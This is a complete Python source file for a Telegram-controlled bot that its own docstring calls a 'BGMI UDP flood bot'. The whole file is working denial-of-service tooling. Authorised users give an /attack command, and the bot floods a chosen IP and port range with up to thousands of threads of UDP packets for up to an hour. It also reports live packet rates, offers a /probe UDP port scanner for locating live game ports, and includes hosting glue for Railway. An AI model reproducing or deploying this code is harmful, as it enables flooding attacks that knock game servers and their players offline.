#!/usr/bin/env python3
"""BOOM BOT — private BGMI UDP flood bot. Plug & play."""

import asyncio
import os
import resource
import socket
import threading
import time
from concurrent.futures import ThreadPoolExecutor

from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import (
    Application, CommandHandler, MessageHandler, ContextTypes, Defaults, filters,
)

# ------------------------------------------------------------------ config
TOKEN      = os.environ["BOT_TOKEN"]
OWNER_ID   = int(os.environ["OWNER_ID"])
ALLOWED    = {int(x) for x in os.environ.get("ALLOWED_IDS", "").replace(" ", "").split(",") if x}
ALLOWED.add(OWNER_ID)

DEF_PORTS    = os.environ.get("DEFAULT_PORTS", "10012,17500,20000")
DEF_DURATION = int(os.environ.get("DEFAULT_DURATION", "60"))
DEF_THREADS  = int(os.environ.get("DEFAULT_THREADS", "500"))
DEF_PAYLOAD  = int(os.environ.get("DEFAULT_PAYLOAD", "512"))
MAX_THREADS  = 4000
MAX_PORTS    = 2048

HELP = (
    "💥 <b>BOOM BOT</b>\n\n"
    "<code>/attack ip [port] [secs] [threads] [bytes]</code>\n"
    "port can be <code>10012</code>, a range <code>10000-10100</code>, or a list <code>10012,17500,20000</code>\n\n"
    "no port? floods the default set\n"
    "no secs? uses the default\n\n"
    "🛑 /stop — kill it\n"
    "📡 /ping ip — reachability\n"
    "🔍 /probe ip [ports] — find the live port\n"
    "📊 /status — live stats"
)


# ------------------------------------------------------------------ helpers
def raise_limits():
    try:
        soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
        want = min(hard, 65535)
        if soft < want:
            resource.setrlimit(resource.RLIMIT_NOFILE, (want, hard))
    except Exception:
        pass


def parse_ports(tok):
    out = []
    for part in str(tok).split(","):
        part = part.strip()
        if not part:
            continue
        if "-" in part:
            a, b = part.split("-", 1)
            out.extend(range(int(a), int(b) + 1))
        else:
            out.append(int(part))
    return out[:MAX_PORTS] or parse_ports(DEF_PORTS)


def ok(update: Update) -> bool:
    u = update.effective_user
    return bool(u and u.id in ALLOWED)


# ------------------------------------------------------------------ engine
class Flooder:
    def __init__(self, ip, ports, duration, threads, payload_size):
        self.ip, self.ports = ip, ports
        self.duration, self.threads, self.plen = duration, threads, payload_size
        self.payload = os.urandom(payload_size)
        self.stats = []
        self.stop_flag = threading.Event()
        self.start_time = 0.0

    def _worker(self, idx):
        port = self.ports[idx % len(self.ports)]
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1 << 20)
            s.connect((self.ip, port))          # route cached -> faster send()
        except OSError:
            return
        send, payload, plen = s.send, self.payload, self.plen
        st = self.stats[idx]
        pkt = byt = 0
        while not self.stop_flag.is_set():
            try:
                send(payload)
                pkt += 1
                byt += plen
            except OSError:
                pass
            st[0] = pkt
            st[1] = byt
        s.close()

    def spawn(self):
        self.stats = [[0, 0] for _ in range(self.threads)]
        self.start_time = time.time()
        threading.stack_size(512 * 1024)
        for i in range(self.threads):
            threading.Thread(target=self._worker, args=(i,), daemon=True).start()

    def elapsed(self):
        return max(time.time() - self.start_time, 0.0001)

    def running(self):
        return not self.stop_flag.is_set() and self.elapsed() < self.duration

    def stop(self):
        self.stop_flag.set()

    def target(self):
        if len(self.ports) == 1:
            return f"{self.ip}:{self.ports[0]}"
        return f"{self.ip}:{self.ports[0]}-{self.ports[-1]} ({len(self.ports)} ports)"

    def report(self, final=False):
        p = sum(x[0] for x in self.stats)
        b = sum(x[1] for x in self.stats)
        e = self.elapsed()
        head = "✅ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐅𝐈𝐍𝐈𝐒𝐇𝐄𝐃" if final else "🔥 𝐀𝐓𝐓𝐀𝐂𝐊 𝐑𝐔𝐍𝐍𝐈𝐍𝐆"
        return (
            f"{head}\n\n"
            f"🎯 <code>{self.target()}</code>\n"
            f"⏱ {e:.0f}s / {self.duration}s\n"
            f"🧵 {self.threads} thr · {self.plen}B\n"
            f"📦 {p:,} pkts · {b / 1048576:.1f} MB\n"
            f"⚡ {p / e:,.0f} pps · {(b * 8) / e / 1e6:.1f} Mbps"
        )


# ------------------------------------------------------------------ commands
async def cmd_start(update, ctx):
    if ok(update):
        await update.message.reply_text(HELP)


async def cmd_stop(update, ctx):
    if not ok(update):
        return
    fl = ctx.bot_data.get("flooder")
    if fl and fl.running():
        fl.stop()
        await update.message.reply_text("🛑 𝐒𝐭𝐨𝐩𝐩𝐞𝐝")
    else:
        await update.message.reply_text("𝐍𝐨𝐭𝐡𝐢𝐧𝐠 𝐫𝐮𝐧𝐧𝐢𝐧𝐠")


async def cmd_status(update, ctx):
    if not ok(update):
        return
    fl = ctx.bot_data.get("flooder")
    if fl and fl.running():
        await update.message.reply_text(fl.report())
    else:
        await update.message.reply_text("𝐈𝐝𝐥𝐞")


async def cmd_ping(update, ctx):
    if not ok(update):
        return
    p = update.message.text.split()
    if len(p) < 2:
        return await update.message.reply_text("usage: /ping ip")
    loop = asyncio.get_running_loop()
    try:
        ip = await loop.run_in_executor(None, socket.gethostbyname, p[1])
    except OSError:
        return await update.message.reply_text("❌ bad host")
    for priv in (False, True):
        try:
            from icmplib import ping as icmp_ping
            r = await loop.run_in_executor(
                None, lambda x=priv: icmp_ping(ip, count=4, timeout=1, privileged=x))
            if r.is_alive:
                return await update.message.reply_text(
                    f"📡 <code>{ip}</code> · {r.packets_sent - r.packets_lost}/4 · avg {r.avg_rtt:.0f}ms")
            return await update.message.reply_text(f"❌ <code>{ip}</code> no reply")
        except ImportError:
            break
        except Exception:
            continue
    await update.message.reply_text("📡 ping unavailable")


def _probe_one(ip, port, timeout=1.0):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(timeout)
    try:
        s.connect((ip, port))
        s.send(b"\x00" * 8)
        try:
            s.recv(1024)
            return port, "REPLY"
        except socket.timeout:
            return port, "open|filtered"
        except (ConnectionRefusedError, OSError):
            return port, "closed"
    except OSError:
        return port, "err"
    finally:
        s.close()


async def cmd_probe(update, ctx):
    if not ok(update):
        return
    p = update.message.text.split()
    if len(p) < 2:
        return await update.message.reply_text("usage: /probe ip [ports]")
    loop = asyncio.get_running_loop()
    try:
        ip = await loop.run_in_executor(None, socket.gethostbyname, p[1])
        ports = parse_ports(p[2]) if len(p) > 2 else parse_ports(DEF_PORTS)
    except (OSError, ValueError):
        return await update.message.reply_text("❌ bad args")
    ports = ports[:256]
    msg = await update.message.reply_text(f"🔍 probing {ip} · {len(ports)} ports…")
    with ThreadPoolExecutor(max_workers=64) as ex:
        res = list(ex.map(lambda pr: _probe_one(ip, pr), ports))
    live = [f"{pt} <i>{st}</i>" for pt, st in res if st != "closed"]
    body = "\n".join(live[:60]) or "everything closed"
    await msg.edit_text(f"🔍 <code>{ip}</code> — {len(live)}/{len(ports)} not-closed\n\n{body}")


async def cmd_attack(update, ctx):
    if not ok(update):
        return
    if ctx.bot_data.get("flooder") and ctx.bot_data["flooder"].running():
        return await update.message.reply_text("⚠️ 𝐁𝐮𝐬𝐲 — /stop first")

    p = update.message.text.split()
    if p and p[0].startswith("/"):
        p = p[1:]
    if not p:
        return await update.message.reply_text(HELP)
    try:
        ip = socket.gethostbyname(p[0])
        ports = parse_ports(p[1]) if len(p) > 1 else parse_ports(DEF_PORTS)
        duration = min(int(p[2]), 3600) if len(p) > 2 else DEF_DURATION
        threads = min(int(p[3]) if len(p) > 3 else DEF_THREADS, MAX_THREADS)
        payload = int(p[4]) if len(p) > 4 else DEF_PAYLOAD
    except (ValueError, OSError):
        return await update.message.reply_text(HELP)

    fl = Flooder(ip, ports, duration, threads, payload)
    ctx.bot_data["flooder"] = fl
    fl.spawn()
    msg = await update.message.reply_text(fl.report())
    while fl.running():
        await asyncio.sleep(2)
        try:
            await msg.edit_text(fl.report())
        except Exception:
            pass
    fl.stop()
    await asyncio.sleep(0.4)
    try:
        await msg.edit_text(fl.report(final=True))
    except Exception:
        pass


# ------------------------------------------------------------------ railway safety net
def health_server():
    port = os.environ.get("PORT")
    if not port:
        return
    from http.server import BaseHTTPRequestHandler, HTTPServer

    class H(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"ok")

        def log_message(self, *a):
            pass

    threading.Thread(
        target=HTTPServer(("0.0.0.0", int(port)), H).serve_forever, daemon=True
    ).start()


# ------------------------------------------------------------------ main
def main():
    raise_limits()
    health_server()
    app = (Application.builder().token(TOKEN)
           .defaults(Defaults(parse_mode=ParseMode.HTML)).build())
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_start))
    app.add_handler(CommandHandler("attack", cmd_attack))
    app.add_handler(CommandHandler("stop", cmd_stop))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("ping", cmd_ping))
    app.add_handler(CommandHandler("probe", cmd_probe))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, cmd_attack))
    app.run_polling(drop_pending_updates=True, allowed_updates=["message"])


if __name__ == "__main__":
    main()